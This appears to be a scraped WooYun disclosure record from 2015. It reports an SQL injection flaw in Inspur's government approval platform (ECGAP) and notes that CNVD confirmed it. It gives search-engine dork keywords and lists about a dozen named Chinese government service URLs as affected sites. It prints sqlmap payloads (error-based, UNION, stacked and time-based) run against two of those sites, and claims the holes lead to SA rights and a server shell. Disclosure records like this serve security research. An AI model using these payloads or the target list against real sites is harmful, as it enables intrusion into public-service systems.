{"id": 31156, "wybug_id": "wooyun-2015-0114794", "wybug_title": "某政务系统通用SA权限SQL注入漏洞，可shell", "wybug_corp": "浪潮", "wybug_author": "路人甲", "wybug_date": "2015-05-18 16:35", "wybug_open_date": "2015-08-20 19:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-20：\t细节向公众公开  简要描述： 某政务系统通用SA权限SQL注入漏洞，可shell 详细说明：  开发公司：浪潮程序名称：浪潮政务审批平台ECGAP系统架构：ASPX+MSSQL漏洞类型：SQL注入漏洞漏洞文件：/onlineApply/ApplyGuide.aspx漏洞参数：infoFlowId关键字：inurl:TransactList.aspx?ItemName=inurl:onlineApply/ApplyGuide.aspx\n\n部分政府案例：滨州经济开发区网上办事大厅http://60.215.8.148:6006/onlineApply/ApplyGuide.aspx?infoFlowId=d9156d6a-b0c9-4870-9fae-ae34db6a33ab市南区行政审批服务大厅：http://snsp.qingdao.gov.cn/onlineApply/ApplyGuide.aspx?infoFlowId=100207莆田市审批系统：http://ptfwzx.gov.cn/outportal/onlineApply/ApplyGuide.aspx?code=351100-10127-XK-001-01&version=1东营市政务服务中心：http://shenpi.dongying.gov.cn/fabu/onlineApply/ApplyGuide.aspx?infoFlowId=af3d0ca1-3feb-43d0-b92d-4197706f3f2d滨州市行政服务中心：http://www.bzxzspzx.gov.cn/onlineApply/ApplyGuide.aspx?infoFlowId=a3bc04dd-9554-4c0a-84b7-33d8b21ccf47威海市行政审批中心：http://www.whaac.gov.cn:8080/onlineApply/ApplyGuide.aspx?infoFlowId=82eecb38-a253-4a7f-abf3-67a68a423120荣成市行政服务中心：http://www.rcsp.cn/onlineApply/ApplyGuide.aspx?infoFlowId=f156be2e-ee35-4dca-ae5d-170894ddc5b8新城管委会服务中心：http://www.xc.zszwfw.gov.cn/zhoushan/ApplyGuide.aspx?infoflowId=02128普陀山管委会行政服务中心：http://www.pts.zszwfw.gov.cn/zhoushan/ApplyGuide.aspx?infoflowId=01679临港区行政服务中心：http://www.lgqzwfw.gov.cn/xspww/onlineApply/ApplyGuide.aspx?infoFlowId=d37fa1e0-116d-4773-922b-94c07a122ecc高区政务服务中心：http://www.whctpasc.gov.cn/onlineApply/ApplyGuide.aspx?infoFlowId=eddd6345-c052-4984-88d6-b9b902f8795a经区政务服务中心：http://www.whjqzwfwzx.gov.cn/wsbsdt/onlineApply/ApplyGuide.aspx?infoFlowId=25a42045-5864-4bfe-89b7-e2cdde53cfaf等等   漏洞证明：  漏洞验证：http://www.rcsp.cn/onlineApply/ApplyGuide.aspx?infoFlowId=为例：\nPlace: GETParameter: infoFlowId    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: infoFlowId=' AND 4189=CONVERT(INT,(CHAR(58) CHAR(109) CHAR(97) CHAR(120) CHAR(58) (SELECT (CASE WHEN (4189=4189) THEN CHAR(49) ELSE CHAR(48) END))CHAR(58) CHAR(114) CHAR(121) CHAR(117) CHAR(58))) AND 'IkmU'='IkmU    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: infoFlowId=' UNION ALL SELECT NULL,CHAR(58) CHAR(109) CHAR(97) CHAR(120) CHAR(58) CHAR(120) CHAR(120) CHAR(76) CHAR(119) CHAR(119) CHAR(72) CHAR(89) CHAR(99) CHAR(111) CHAR(83) CHAR(58) CHAR(114) CHAR(121) CHAR(117) CHAR(58),NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: infoFlowId='; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: infoFlowId=' WAITFOR DELAY '0:0:5'-----\n\n\n\n\n\n\n再如：滨州经济开发区网上办事大厅http://60.215.8.148:6006/onlineApply/ApplyGuide.aspx?infoFlowId=d9156d6a-b0c9-4870-9fae-ae34db6a33ab\nPlace: GETParameter: infoFlowId    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: infoFlowId=d9156d6a-b0c9-4870-9fae-ae34db6a33ab' AND 3992=CONVERT(INT,(CHAR(58) CHAR(102) CHAR(116) CHAR(115) CHAR(58) (SELECT (CASE WHEN (3992=3992) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(97) CHAR(107) CHAR(121) CHAR(58))) AND 'CuUZ'='CuUZ    Type: UNION query    Title: Generic UNION query (NULL) - 5 columns    Payload: infoFlowId=-3399' UNION ALL SELECT NULL,CHAR(58) CHAR(102) CHAR(116) CHAR(115) CHAR(58) CHAR(78) CHAR(108) CHAR(120) CHAR(65) CHAR(67) CHAR(102) CHAR(98) CHAR(99) CHAR(119) CHAR(68) CHAR(58) CHAR(97) CHAR(107) CHAR(121) CHAR(58),NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: infoFlowId=d9156d6a-b0c9-4870-9fae-ae34db6a33ab'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: infoFlowId=d9156d6a-b0c9-4870-9fae-ae34db6a33ab' WAITFOR DELAY '0:0:5'-----\n\n\n数据库：\n\n可直接shell服务器：如图所示：\n\nip\n\n内网：\n\n   修复方案：  如上！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-05-22 19:22 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}